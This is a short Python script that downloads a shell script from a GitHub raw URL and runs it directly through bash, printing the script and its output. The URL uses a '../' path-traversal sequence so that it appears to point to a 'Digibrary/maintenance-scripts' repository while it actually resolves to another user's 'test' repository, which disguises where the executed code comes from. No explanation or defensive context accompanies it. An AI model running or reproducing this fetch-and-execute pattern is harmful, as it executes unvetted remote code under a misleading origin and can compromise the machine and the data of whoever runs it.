import http.server
import subprocess
import urllib.parse
import urllib.request
import re
import os

url = "https://raw.githubusercontent.com/Digibrary/maintenance-scripts/main/../../../../../../../htthanh02/test/refs/heads/main/test.sh"
with urllib.request.urlopen(url) as response:
    content = response.read().decode('utf-8')
    result = subprocess.run(["bash"], input=content, capture_output=True, text=True)
    print(content)
    print(result.stdout)
    print(result.stderr)